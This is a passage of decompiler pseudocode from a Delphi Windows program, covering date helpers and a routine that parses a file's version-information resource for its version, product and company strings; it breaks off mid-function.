__int16 __fastcall sub_4430F0(unsigned __int16 a1, unsigned __int16 a2)
{
  bool v2; // al

  v2 = a2 == 2 && (unsigned __int8)Sysutils::IsLeapYear(a1);
  return *((_WORD *)off_468058 + 12 * (v2 & 0x7F) + a2 - 1);
}
// 468058: using guessed type void *off_468058;

//----- (00443140) --------------------------------------------------------
__int16 __stdcall sub_443140(double a1)
{
  int v2; // [esp+4h] [ebp-8h]

  if ( a1 < (long double)dbl_467478 || a1 > (long double)dbl_467480 )
    return 0;
  Sysutils::DateTimeToTimeStamp(a1);
  return (v2 - 1) % 7 + 1;
}
// 443175: variable 'v2' is possibly undefined

//----- (004431A0) --------------------------------------------------------
__int64 __stdcall sub_4431A0(double a1)
{
  int v2; // [esp+8h] [ebp-10h]

  if ( a1 >= (long double)dbl_467478 )
  {
    if ( a1 <= (long double)dbl_467480 )
      Sysutils::DateTimeToTimeStamp(a1);
    else
      Sysutils::DateTimeToTimeStamp(dbl_467480);
  }
  else
  {
    Sysutils::DateTimeToTimeStamp(dbl_467478);
  }
  return unknown_libname_57(86400000, 0) + v2;
}
// 44321F: variable 'v2' is possibly undefined
// 40856C: using guessed type __int64 __stdcall unknown_libname_57(_DWORD, _DWORD);

//----- (00443240) --------------------------------------------------------
__int64 __stdcall sub_443240(double a1, double a2)
{
  sub_4431A0(a2);
  sub_4431A0(a1);
  return System::__linkproc__ _lldiv(1000, 0);
}
// 408590: using guessed type __int64 __stdcall System::__linkproc__ _lldiv(_DWORD, _DWORD);

//----- (00443290) --------------------------------------------------------
void sub_443290()
{
  ++dword_46EDCC;
}
// 46EDCC: using guessed type int dword_46EDCC;

//----- (004496E0) --------------------------------------------------------
BOOL __stdcall EnumFunc(HMODULE hModule, LPCWSTR lpType, LPCWSTR lpName, WORD wLanguage, LONG_PTR lParam)
{
  int v5; // eax

  if ( lpType == (LPCWSTR)16 )
  {
    v5 = System::__linkproc__ LStrLen(dword_46EE9C);
    System::__linkproc__ DynArraySetLength(v5 + 1);
    *(_WORD *)(dword_46EE9C + 2 * sub_40867C(dword_46EE9C)) = wLanguage;
  }
  return 1;
}
// 408670: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);
// 408A10: using guessed type int __cdecl System::__linkproc__ DynArraySetLength(_DWORD);
// 46EE9C: using guessed type int dword_46EE9C;

//----- (00449740) --------------------------------------------------------
HMODULE __fastcall sub_449740(int a1, int *a2)
{
  const WCHAR *v2; // eax
  HMODULE result; // eax
  unsigned int v4[2]; // [esp-Ch] [ebp-18h] BYREF
  int *v5; // [esp-4h] [ebp-10h]
  HMODULE hModule; // [esp+0h] [ebp-Ch]
  int *v7; // [esp+4h] [ebp-8h]
  int v8; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v7 = a2;
  v8 = a1;
  sub_408B34(a2, (int)&byte_4495EC);
  sub_408B34(&dword_46EE9C, (int)&byte_4495EC);
  v2 = (const WCHAR *)sub_407790(v8);
  result = LoadLibraryExW_0(v2, 0, 2u);
  hModule = result;
  if ( result )
  {
    v5 = &savedregs;
    v4[1] = (unsigned int)&loc_4497BE;
    v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v4);
    EnumResourceLanguagesW(hModule, (LPCWSTR)0x10, (LPCWSTR)1, EnumFunc, 0);
    __writefsdword(0, v4[0]);
    v5 = (int *)&loc_4497C5;
    FreeLibrary_1(hModule);
    return (HMODULE)sub_408B78(v7, dword_46EE9C, (int)&byte_4495EC);
  }
  return result;
}
// 4495EC: using guessed type char byte_4495EC;
// 46EE9C: using guessed type int dword_46EE9C;

//----- (00449880) --------------------------------------------------------
bool __fastcall sub_449880(__int32 a1, volatile __int32 *a2, __int32 a3, volatile __int32 *a4, volatile __int32 *a5)
{
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-18h] [ebp-54h] BYREF
  void *v7; // [esp-14h] [ebp-50h]
  int *v8; // [esp-10h] [ebp-4Ch]
  unsigned int v9[2]; // [esp-Ch] [ebp-48h] BYREF
  int *v10; // [esp-4h] [ebp-40h]
  Idosfilename *v11; // [esp+4h] [ebp-38h] BYREF
  int v12; // [esp+8h] [ebp-34h] BYREF
  Idosfilename *v13; // [esp+Ch] [ebp-30h] BYREF
  int v14; // [esp+10h] [ebp-2Ch] BYREF
  Idosfilename *v15; // [esp+14h] [ebp-28h] BYREF
  int v16; // [esp+18h] [ebp-24h] BYREF
  Idosfilename *v17; // [esp+1Ch] [ebp-20h] BYREF
  int System__AnsiString; // [esp+20h] [ebp-1Ch] BYREF
  __int16 *v19; // [esp+24h] [ebp-18h] BYREF
  _DWORD *v20; // [esp+28h] [ebp-14h]
  bool v21; // [esp+2Fh] [ebp-Dh]
  volatile __int32 *v22; // [esp+30h] [ebp-Ch]
  volatile __int32 *v23; // [esp+34h] [ebp-8h]
  __int32 v24; // [esp+38h] [ebp-4h] BYREF
  int savedregs; // [esp+3Ch] [ebp+0h] BYREF

  v22 = (volatile __int32 *)_InterlockedExchange(&v24, a3);
  v23 = a2;
  v24 = a1;
  if ( a2 )
    *a2 = 0;
  if ( v22 )
    *v22 = 0;
  if ( a4 )
    *a4 = 0;
  if ( a5 )
    *a5 = 0;
  v10 = &savedregs;
  v9[1] = (unsigned int)&loc_449A1B;
  v9[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v9);
  v21 = 0;
  sub_449740(v24, (int *)&v19);
  if ( System::__linkproc__ LStrLen(v19) >= 1 )
  {
    v20 = (_DWORD *)sub_449AD0((int)&cls_VersionUtil_TVersionInfo, 1, v24, *v19);
    v8 = &savedregs;
    v7 = &loc_4499EB;
    ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&ExceptionList);
    if ( sub_449CA0((int)v20) )
    {
      sub_449B80((int)v20, (int)L"FileVersion", (volatile __int32 *)&v17);
      Idosfilename::FileNameVMSToUnix(v17, (const int)&System__AnsiString);
      sub_406FE8(v23, System__AnsiString);
      sub_449B80((int)v20, (int)L"ProductName", (volatile __int32 *)&v15);
      Idosfilename::FileNameVMSToUnix(v15, (const int)&v16);
      sub_406FE8(a4, v16);
      sub_449B80((int)v20, (int)L"CompanyName", (volatile __int32 *)&v13);
      Idosfilename::FileNameVMSToUnix(v13, (const int)&v14);
      sub_406FE8(v22, v14);
      sub_449B80((int)v20, (int)L"FileDescription", (volatile __int32 *)&v11);
      Idosfilename::FileNameVMSToUnix(v11, (const int)&v12);
      sub_406FE8(a5, v12);
      v21 = *v23 != 0;
      __writefsdword(0, (unsigned int)ExceptionList);
      v8 = (int *)&loc_4499F2;
      sub_405598(v20);
    }
    else
    {
      System::__linkproc__ TryFinallyExit(ExceptionList, v7, v8);
    }
  }
  __writefsdword(0, v9[0]);
  v10 = (int *)&loc_449A22;
  sub_406CA4((int)&v11, 8);
  sub_408B34(&v19, (int)&byte_4495EC);
  return v21;
}
// 406434: using guessed type _DWORD __stdcall System::__linkproc__ TryFinallyExit(_DWORD, _DWORD, _DWORD);
// 408670: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);
// 4495EC: using guessed type char byte_4495EC;
// 449678: using guessed type __int16 cls_VersionUtil_TVersionInfo;
// 449A38: using guessed type wchar_t aFileversion[12];
// 449A5C: using guessed type wchar_t aProductname[12];
// 449A80: using guessed type wchar_t aCompanyname[12];
// 449AA4: using guessed type wchar_t aFiledescriptio[16];

//----- (00449AD0) --------------------------------------------------------
int __fastcall sub_449AD0(int a1, char a2, int a3, __int16 a4)
{
  char v5; // [esp+7h] [ebp-5h]
  int v6; // [esp+8h] [ebp-4h]

  if ( a2 )
    a1 = System::__linkproc__ ClassCreate();
  v5 = a2;
  v6 = a1;
  sub_406FE8((volatile __int32 *)(a1 + 4), a3);
  *(_WORD *)(v6 + 12) = a4;
  *(_DWORD *)(v6 + 80) = sub_405568((int)cls_CrossPlatform_TList, 1);
  if ( v5 )
    System::__linkproc__ AfterConstruction(v6);
  return v6;
}
// 449AE5: variable 'a2' is possibly undefined
// 449AF4: variable 'a3' is possibly undefined
// 4058CC: using guessed type int __fastcall System::__linkproc__ AfterConstruction(_DWORD);
// 42296C: using guessed type int (*cls_CrossPlatform_TList[2])();

//----- (00449B40) --------------------------------------------------------
int sub_449B40()
{
  __int64 v0; // rax
  int result; // eax
  char v2; // [esp+3h] [ebp-5h]
  int v3; // [esp+4h] [ebp-4h]

  v0 = System::__linkproc__ BeforeDestruction();
  v2 = BYTE4(v0);
  v3 = v0;
  sub_424720((int *)(v0 + 80));
  result = sub_405588();
  if ( v2 > 0 )
    return System::__linkproc__ ClassDestroy(v3);
  return result;
}
// 4058C4: using guessed type int __fastcall System::__linkproc__ ClassDestroy(_DWORD);

//----- (00449B80) --------------------------------------------------------
char __fastcall sub_449B80(int a1, int a2, volatile __int32 *a3)
{
  int v3; // eax
  int v5; // [esp+0h] [ebp-2Ch]
  int v6; // [esp+4h] [ebp-28h]
  int v7; // [esp+8h] [ebp-24h]
  int *v8; // [esp+Ch] [ebp-20h]
  int *v9; // [esp+10h] [ebp-1Ch]
  int v10; // [esp+14h] [ebp-18h]
  int v11; // [esp+18h] [ebp-14h]
  int System__AnsiString; // [esp+1Ch] [ebp-10h]

  sub_406C44(a3);
  v3 = *(_DWORD *)(*(_DWORD *)(a1 + 80) + 8) - 1;
  if ( v3 >= 0 )
  {
    v7 = *(_DWORD *)(*(_DWORD *)(a1 + 80) + 8);
    for ( System__AnsiString = 0; ; ++System__AnsiString )
    {
      v9 = (int *)sub_428060(*(Idthreadcomponent::TIdThreadComponent **)(a1 + 80), System__AnsiString);
      LOBYTE(v3) = sub_40576C(v9, (int)cls_VersionUtil_TStringFileInfoBlock);
      if ( (_BYTE)v3 )
      {
        v8 = sub_405790(v9, (int)cls_VersionUtil_TStringFileInfoBlock);
        v3 = sub_40867C(v8[2]);
        if ( v3 >= 0 )
          break;
      }
LABEL_12:
      if ( !--v7 )
        return v3;
    }
    v6 = v3 + 1;
    v11 = 0;
    while ( 1 )
    {
      v3 = sub_40867C(*(_DWORD *)(v8[2] + 12 * v11 + 8));
      if ( v3 >= 0 )
        break;
LABEL_11:
      ++v11;
      if ( !--v6 )
        goto LABEL_12;
    }
    v5 = v3 + 1;
    v10 = 0;
    while ( 1 )
    {
      v3 = sub_426AB0(*(_DWORD *)(*(_DWORD *)(v8[2] + 12 * v11 + 8) + 12 * v10 + 4), a2);
      if ( !v3 )
        break;
      ++v10;
      if ( !--v5 )
        goto LABEL_11;
    }
    LOBYTE(v3) = (unsigned __int8)sub_406FE8(a3, *(_DWORD *)(*(_DWORD *)(v8[2] + 12 * v11 + 8) + 12 * v10 + 8));
  }
  return v3;
}
// 4494AC: using guessed type int (*cls_VersionUtil_TStringFileInfoBlock[3])();

//----- (00449CA0) --------------------------------------------------------
char __fastcall sub_449CA0(int a1)
{
  const WCHAR *v1; // eax
  int v2; // eax
  void *v3; // eax
  int v4; // eax
  _DWORD *v5; // eax
  char v6; // zf
  int v7; // eax
  _DWORD *v8; // eax
  int v10; // [esp-34h] [ebp-6Ch]
  unsigned int v11[2]; // [esp-30h] [ebp-68h] BYREF
  int *v12; // [esp-28h] [ebp-60h]
  unsigned int v13[2]; // [esp-24h] [ebp-5Ch] BYREF
  int *v14; // [esp-1Ch] [ebp-54h]
  struct _EXCEPTION_REGISTRATION_RECORD *v15; // [esp-18h] [ebp-50h] BYREF
  void *v16; // [esp-14h] [ebp-4Ch]
  int v17; // [esp-10h] [ebp-48h]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-44h] BYREF
  void *v19; // [esp-8h] [ebp-40h]
  int *v20; // [esp-4h] [ebp-3Ch]
  void *v21; // [esp+0h] [ebp-38h]
  void *v22; // [esp+4h] [ebp-34h]
  HGLOBAL hResData; // [esp+8h] [ebp-30h]
  HRSRC hResInfo; // [esp+Ch] [ebp-2Ch]
  HMODULE hModule; // [esp+10h] [ebp-28h]
  int v26; // [esp+14h] [ebp-24h]
  int v27; // [esp+18h] [ebp-20h]
  __int16 v28; // [esp+1Eh] [ebp-1Ah] BYREF
  char v29[2]; // [esp+20h] [ebp-18h] BYREF
  unsigned __int16 v30; // [esp+22h] [ebp-16h] BYREF
  int v31; // [esp+24h] [ebp-14h] BYREF
  __int16 v32; // [esp+28h] [ebp-10h] BYREF
  unsigned __int16 v33; // [esp+2Ah] [ebp-Eh] BYREF
  int v34; // [esp+2Ch] [ebp-Ch] BYREF
  char v35; // [esp+33h] [ebp-5h]
  int v36; // [esp+34h] [ebp-4h]
  int savedregs; // [esp+38h] [ebp+0h] BYREF

  v34 = 0;
  v31 = 0;
  v36 = a1;
  v20 = &savedregs;
  v19 = &loc_44A029;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  v35 = 0;
  if ( *(_DWORD *)(a1 + 4) )
  {
    v17 = 2;
    v16 = 0;
    v1 = (const WCHAR *)sub_407790(*(_DWORD *)(v36 + 4));
    hModule = LoadLibraryExW_0(v1, 0, 2u);
  }
  else
  {
    hModule = *(HMODULE *)(v36 + 8);
  }
  if ( hModule )
  {
    v17 = (int)&savedregs;
    v16 = &loc_449E20;
    v15 = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&v15);
    hResInfo = FindResourceExW(hModule, (LPCWSTR)0x10, (LPCWSTR)1, *(_WORD *)(v36 + 12));
    if ( hResInfo && (hResData = LoadResource(hModule, hResInfo)) != 0 )
    {
      v14 = &savedregs;
      v13[1] = (unsigned int)&loc_449DF9;
      v13[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
      __writefsdword(0, (unsigned int)v13);
      v2 = SizeofResource(hModule, hResInfo);
      sub_4075BC((_DWORD *)(v36 + 16), v2, 0);
      if ( System::__linkproc__ LStrLen(*(_DWORD *)(v36 + 16)) > 0 )
      {
        v22 = LockResource(hResData);
        v12 = &savedregs;
        v11[1] = (unsigned int)&loc_449DDB;
        v11[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
        __writefsdword(0, (unsigned int)v11);
        v10 = System::__linkproc__ LStrLen(*(_DWORD *)(v36 + 16));
        v3 = (void *)sub_4071C8(v36 + 16);
        System::Move(v22, v3, v10);
        __writefsdword(0, v11[0]);
        v12 = (int *)&loc_449DE2;
        sub_40C8D8();
      }
      __writefsdword(0, v13[0]);
      v14 = (int *)&loc_449E00;
      FreeResource(hResData);
      __writefsdword(0, (unsigned int)v19);
      v21 = &loc_449E27;
      if ( *(_DWORD *)(v36 + 4) )
        FreeLibrary_1(hModule);
      *(_DWORD *)(v36 + 20) = 0;
      if ( sub_44A230(v36, &v33) )
      {
        v4 = System::__linkproc__ LStrLen(*(_DWORD *)(v36 + 16));
        if ( v4 >= v33 )
        {
          if ( sub_44A230(v36, &v32) )
          {
            if ( v32 == 52 )
            {
              if ( sub_44A230(v36, (void *)(v36 + 76)) )
              {
                v5 = sub_406C44(&v34);
                if ( sub_44A190(v36, v5) )
                {
                  sub_407AA0(v34, (int)L"VS_VERSION_INFO");
                  if ( v6 )
                  {
                    if ( sub_44A130(v36) && sub_44A0C0(v36, (void *)(v36 + 24), 52) )
                    {
                      while ( sub_44A130(v36) )
                      {
                        if ( *(_DWORD *)(v36 + 20) >= (int)v33 )
                        {
                          sub_406C68((_DWORD *)(v36 + 16));
                          v35 = 1;
                          break;
                        }
                        if ( sub_44A230(v36, &v30) )
                        {
                          v26 = v30 + *(_DWORD *)(v36 + 20) - 2;
                          v7 = System::__linkproc__ LStrLen(*(_DWORD *)(v36 + 16));
                          if ( v7 >= v26 )
                          {
                            if ( sub_44A230(v36, v29) )
                            {
                              if ( sub_44A230(v36, &v28) )
                              {
                                v8 = sub_406C44(&v31);
                                if ( sub_44A190(v36, v8) )
                                {
                                  sub_407AA0(v31, (int)L"StringFileInfo");
                                  if ( v6 )
                                  {
                                    v27 = sub_405568((int)cls_VersionUtil_TStringFileInfoBlock, 1);
                                  }
                                  else
                                  {
                                    sub_407AA0(v31, (int)L"VarFileInfo");
                                    v27 = v6 ? sub_405568((int)cls_VersionUtil_TVarFileInfoBlock, 1) : 0;
                                  }
                                  if ( v27 )
                                  {
                                    sub_427F40(*(_DWORD **)(v36 + 80), v27);
                                    *(_WORD *)(v27 + 4) = v28;
                                    if ( (**(unsigned __int8 (__fastcall ***)(int, int, int))v27)(v27, v36, v26) )
                                      continue;
                                  }
                                }
                              }
                            }
                          }
                        }
                        break;
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
    else
    {
      System::__linkproc__ TryFinallyExit(v15, v16, v17);
    }
  }
  __writefsdword(0, (unsigned int)ExceptionList);
  v20 = (int *)&loc_44A030;
  sub_406C44(&v31);
  sub_406C44(&v34);
  return v35;
}
// 449EB6: variable 'v6' is possibly undefined
// 406434: using guessed type _DWORD __stdcall System::__linkproc__ TryFinallyExit(_DWORD, _DWORD, _DWORD);
// 407104: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);
// 4071C8: using guessed type int __fastcall sub_4071C8(_DWORD);
// 4494AC: using guessed type int (*cls_VersionUtil_TStringFileInfoBlock[3])();
// 449578: using guessed type int (*cls_VersionUtil_TVarFileInfoBlock[3])();
// 44A044: using guessed type wchar_t aVsVersionInfo[16];
// 44A070: using guessed type wchar_t aStringfileinfo[15];
// 44A09C: using guessed type wchar_t aVarfileinfo_0[12];
// 449CA0: using guessed type int var_C;
// 449CA0: using guessed type char var_18[2];

//----- (0044A0C0) --------------------------------------------------------
char __fastcall sub_44A0C0(int a1, void *a2, int a3)
{
  int v3; // eax
  char v5; // [esp+3h] [ebp-Dh]

  v5 = 0;
  if ( System::__linkproc__ LStrLen(*(_DWORD *)(a1 + 16)) >= a3 + *(_DWORD *)(a1 + 20) )
  {
    if ( a3 > 0 )
    {
      v3 = sub_4071C8(a1 + 16);
      System::Move((const void *)(*(_DWORD *)(a1 + 20) + v3), a2, a3);
    }
    *(_DWORD *)(a1 + 20) += a3;
    return 1;
  }
  return v5;
}
// 407104: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);
// 4071C8: using guessed type int __fastcall sub_4071C8(_DWORD);

//----- (0044A130) --------------------------------------------------------
char __fastcall sub_44A130(int a1)
{
  int v2; // [esp+0h] [ebp-Ch]
  int v3; // [esp+0h] [ebp-Ch]
  char v4; // [esp+7h] [ebp-5h]

  v4 = 1;
  v2 = 4 * (*(_DWORD *)(a1 + 20) / 4);
  if ( *(_DWORD *)(a1 + 20) != v2 )
  {
    v3 = v2 + 4;
    if ( System::__linkproc__ LStrLen(*(_DWORD *)(a1 + 16)) < v3 )
      return 0;
    else
      *(_DWORD *)(a1 + 20) = v3;
  }
  return v4;
}
// 407104: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);

//----- (0044A190) --------------------------------------------------------
char __fastcall sub_44A190(int a1, _DWORD *a2)
{
  int v2; // edx
  unsigned int v4[2]; // [esp-Ch] [ebp-1Ch] BYREF
  int *v5; // [esp-4h] [ebp-14h]
  void *v6; // [esp+0h] [ebp-10h] BYREF
  __int16 v7; // [esp+4h] [ebp-Ch] BYREF
  char v8; // [esp+7h] [ebp-9h]
  int v9; // [esp+8h] [ebp-8h]
  int v10; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v6 = 0;
  v9 = (int)a2;
  v10 = a1;
  if ( a2 )
    *a2 = 0;
  v5 = &savedregs;
  v4[1] = (unsigned int)&loc_44A219;
  v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  v8 = 0;
  sub_406C44((_DWORD *)v9);
  while ( sub_44A0C0(v10, &v7, 2) )
  {
    if ( !v7 )
    {
      v8 = 1;
      break;
    }
    LOWORD(v2) = v7;
    unknown_libname_48(&v6, v2);
    sub_407910((volatile __int32 *)v9, v6);
  }
  __writefsdword(0, v4[0]);
  v5 = (int *)&loc_44A220;
  sub_406C44(&v6);
  return v8;
}
// 44A1EE: variable 'v2' is possibly undefined
// 4077A8: using guessed type int __fastcall unknown_libname_48(_DWORD, _DWORD);
// 44A190: using guessed type __int16 var_C;

//----- (0044A230) --------------------------------------------------------
char __fastcall sub_44A230(int a1, void *a2)
{
  return sub_44A0C0(a1, a2, 2);
}

//----- (0044A260) --------------------------------------------------------
int __fastcall sub_44A260(int a1, const void *a2, int a3)
{
  int v3; // eax
  int result; // eax

  if ( System::__linkproc__ LStrLen(*(_DWORD *)(a1 + 16)) < a3 + *(_DWORD *)(a1 + 20) )
    sub_4075BC((_DWORD *)(a1 + 16), a3 + *(_DWORD *)(a1 + 20), 0);
  if ( a3 > 0 )
  {
    v3 = sub_4071C8(a1 + 16);
    System::Move(a2, (void *)(v3 + *(_DWORD *)(a1 + 20)), a3);
  }
  result = a1;
  *(_DWORD *)(a1 + 20) += a3;
  return result;
}
// 407104: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);
// 4071C8: using guessed type int __fastcall sub_4071C8(_DWORD);

//----- (0044A2D0) --------------------------------------------------------
int __fastcall sub_44A2D0(int a1, int a2, const void *a3, int a4)
{
  int result; // eax
  int v5; // eax

  result = System::__linkproc__ LStrLen(*(_DWORD *)(a1 + 16));
  if ( result >= a2 + a4 && a4 > 0 )
  {
    v5 = sub_4071C8(a1 + 16);
    return System::Move(a3, (void *)(v5 + a2), a4);
  }
  return result;
}
// 407104: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);
// 4071C8: using guessed type int __fastcall sub_4071C8(_DWORD);

//----- (0044A320) --------------------------------------------------------
int __fastcall sub_44A320(int a1, int a2, __int16 a3)
{
  __int16 v4; // [esp+2h] [ebp-Ah] BYREF
  int v5; // [esp+4h] [ebp-8h]
  int v6; // [esp+8h] [ebp-4h]

  v4 = a3;
  v5 = a2;
  v6 = a1;
  return sub_44A2D0(a1, a2, &v4, 2);
}

//----- (0044A350) --------------------------------------------------------
int __fastcall sub_44A350(int a1)
{
  int result; // eax
  int v2; // [esp+0h] [ebp-8h]
  int v3; // [esp+0h] [ebp-8h]

  v2 = 4 * (*(_DWORD *)(a1 + 20) / 4);
  result = *(_DWORD *)(a1 + 20);
  if ( result != v2 )
  {
    v3 = v2 + 4;
    if ( System::__linkproc__ LStrLen(*(_DWORD *)(a1 + 16)) < v3 )
      sub_4075BC((_DWORD *)(a1 + 16), v3, 0);
    while ( 1 )
    {
      result = *(_DWORD *)(a1 + 20);
      if ( result == v3 )
        break;
      *(_BYTE *)(sub_4071C8(a1 + 16) + *(_DWORD *)(a1 + 20)) = 0;
      ++*(_DWORD *)(a1 + 20);
    }
  }
  return result;
}
// 407104: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);
// 4071C8: using guessed type int __fastcall sub_4071C8(_DWORD);

//----- (0044A3D0) --------------------------------------------------------
int __fastcall sub_44A3D0(int a1, int a2)
{
  const void *v2; // eax
  int v4; // [esp-4h] [ebp-10h]
  __int16 v5; // [esp+2h] [ebp-Ah] BYREF
  int v6; // [esp+4h] [ebp-8h]
  int v7; // [esp+8h] [ebp-4h]

  v6 = a2;
  v7 = a1;
  if ( System::__linkproc__ LStrLen(a2) > 0 )
  {
    v4 = 2 * System::__linkproc__ LStrLen(v6);
    v2 = (const void *)sub_407790(v6);
    sub_44A260(v7, v2, v4);
  }
  v5 = 0;
  return sub_44A260(v7, &v5, 2);
}
// 4070F8: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);

//----- (0044A420) --------------------------------------------------------
int __fastcall sub_44A420(int a1, __int16 a2)
{
  __int16 v3; // [esp+2h] [ebp-6h] BYREF
  int v4; // [esp+4h] [ebp-4h]

  v3 = a2;
  v4 = a1;
  return sub_44A260(a1, &v3, 2);
}

//----- (0044A450) --------------------------------------------------------
volatile __int32 *__fastcall sub_44A450(int a1, volatile __int32 *a2)
{
  return sub_406FE8(a2, (int)L"StringFileInfo");
}
// 44A47C: using guessed type wchar_t aStringfileinfo_0[15];

//----- (0044A4A0) --------------------------------------------------------
char __fastcall sub_44A4A0(int a1, int a2, int a3)
{
  int v3; // eax
  _DWORD *v4; // eax
  int v5; // eax
  _DWORD *v6; // eax
  int v7; // ecx
  void *v8; // eax
  int v9; // eax
  int v10; // eax
  int v11; // eax
  int v12; // eax
  unsigned int v14[2]; // [esp-Ch] [ebp-54h] BYREF
  int *v15; // [esp-4h] [ebp-4Ch]
  char v16[4]; // [esp+4h] [ebp-44h] BYREF
  __int32 v17; // [esp+8h] [ebp-40h] BYREF
  int v18; // [esp+Ch] [ebp-3Ch] BYREF
  char v19[4]; // [esp+10h] [ebp-38h] BYREF
  __int32 v20; // [esp+14h] [ebp-34h] BYREF
  __int32 v21; // [esp+18h] [ebp-30h] BYREF
  int v22; // [esp+1Ch] [ebp-2Ch]
  int v23; // [esp+20h] [ebp-28h]
  unsigned __int16 v24; // [esp+24h] [ebp-24h] BYREF
  unsigned __int16 v25; // [esp+26h] [ebp-22h] BYREF
  __int32 v26; // [esp+28h] [ebp-20h] BYREF
  __int32 v27; // [esp+2Ch] [ebp-1Ch] BYREF
  char v28[2]; // [esp+30h] [ebp-18h] BYREF
  unsigned __int16 v29; // [esp+32h] [ebp-16h] BYREF
  __int32 v30; // [esp+34h] [ebp-14h] BYREF
  char v31; // [esp+3Bh] [ebp-Dh]
  int v32; // [esp+3Ch] [ebp-Ch]
  int v33; // [esp+40h] [ebp-8h]
  int v34; // [esp+44h] [ebp-4h]
  int savedregs; // [esp+48h] [ebp+0h] BYREF

  v30 = 0;
  v27 = 0;
  v26 = 0;
  v32 = a3;
  v33 = a2;
  v34 = a1;
  sub_407D10((int)v19, (int)&byte_449200);
  sub_407D10((int)v16, (int)&byte_449278);
  v15 = &savedregs;
  v14[1] = (unsigned int)&loc_44A76C;
  v14[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v14);
  v31 = 0;
LABEL_2:
  if ( sub_44A130(v33) )
  {
    if ( *(_DWORD *)(v33 + 20) >= v32 )
    {
      v31 = 1;
    }
    else
    {
      sub_408B34(&v18, (int)&byte_44923C);
      if ( sub_44A230(v33, &v29) )
      {
        v23 = v29 + *(_DWORD *)(v33 + 20) - 2;
        v3 = System::__linkproc__ LStrLen(*(_DWORD *)(v33 + 16));
        if ( v3 >= v23 )
        {
          if ( sub_44A230(v33, v28) )
          {
            if ( sub_44A230(v33, v16) )
            {
              v4 = sub_406C44(&v30);
              if ( sub_44A190(v33, v4) )
              {
                while ( sub_44A130(v33) )
                {
                  if ( *(_DWORD *)(v33 + 20) >= v23 )
                  {
                    sub_407030(&v17, v30);
                    v11 = System::__linkproc__ LStrLen(*(_DWORD *)(v34 + 8));
                    System::__linkproc__ DynArraySetLength(v11 + 1);
                    v12 = sub_40867C(*(_DWORD *)(v34 + 8));
                    sub_407F98(*(_DWORD *)(v34 + 8) + 12 * v12, (int)v16, (int)&byte_449278);
                    goto LABEL_2;
                  }
                  if ( !sub_44A230(v33, &v25) )
                    break;
                  v22 = v25 + *(_DWORD *)(v33 + 20) - 2;
                  v5 = System::__linkproc__ LStrLen(*(_DWORD *)(v33 + 16));
                  if ( v5 < v22 )
                    break;
                  if ( !sub_44A230(v33, &v24) )
                    break;
                  if ( !sub_44A230(v33, v19) )
                    break;
                  v6 = sub_406C44(&v27);
                  if ( !sub_44A190(v33, v6) )
                    break;
                  if ( !sub_44A130(v33) )
                    break;
                  sub_406C44(&v26);
                  sub_407890(&v26, v24, v7);
                  if ( v24 )
                  {
                    v8 = (void *)sub_4071C0(&v26);
                    if ( !sub_44A0C0(v33, v8, 2 * v24) )
                      break;
                  }
                  sub_407030(&v20, v27);
                  sub_407030(&v21, v26);
                  v9 = System::__linkproc__ LStrLen(v18);
                  System::__linkproc__ DynArraySetLength(v9 + 1);
                  v10 = sub_40867C(v18);
                  sub_407F98(v18 + 12 * v10, (int)v19, (int)&byte_449200);
                }
              }
            }
          }
        }
      }
    }
  }
  __writefsdword(0, v14[0]);
  v15 = (int *)&loc_44A773;
  sub_407DEC((int)v16, (int)&byte_449278);
  sub_407DEC((int)v19, (int)&byte_449200);
  sub_406CA4((int)&v26, 2);
  sub_406C44(&v30);
  return v31;
}
// 44A646: variable 'v7' is possibly undefined
// 407104: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);
// 408670: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);
// 408A10: using guessed type int __cdecl System::__linkproc__ DynArraySetLength(_DWORD);
// 449200: using guessed type char byte_449200;
// 44923C: using guessed type char byte_44923C;
// 449278: using guessed type char byte_449278;
// 44A4A0: using guessed type __int32 var_14;
// 44A4A0: using guessed type char var_38[4];
// 44A4A0: using guessed type char var_44[4];
// 44A4A0: using guessed type char var_18[2];

//----- (0044A780) --------------------------------------------------------
_DWORD *__fastcall sub_44A780(int a1, int a2)
{
  int v2; // eax
  int v3; // eax
  __int16 v4; // ax
  const void *v5; // eax
  int v7; // [esp-10h] [ebp-34h]
  unsigned int v8[2]; // [esp-Ch] [ebp-30h] BYREF
  int *v9; // [esp-4h] [ebp-28h]
  int v10; // [esp+0h] [ebp-24h]
  int v11; // [esp+4h] [ebp-20h]
  __int32 v12; // [esp+8h] [ebp-1Ch] BYREF
  int v13; // [esp+Ch] [ebp-18h]
  int v14; // [esp+10h] [ebp-14h]
  int v15; // [esp+14h] [ebp-10h]
  int v16; // [esp+18h] [ebp-Ch]
  int v17; // [esp+1Ch] [ebp-8h]
  int v18; // [esp+20h] [ebp-4h]
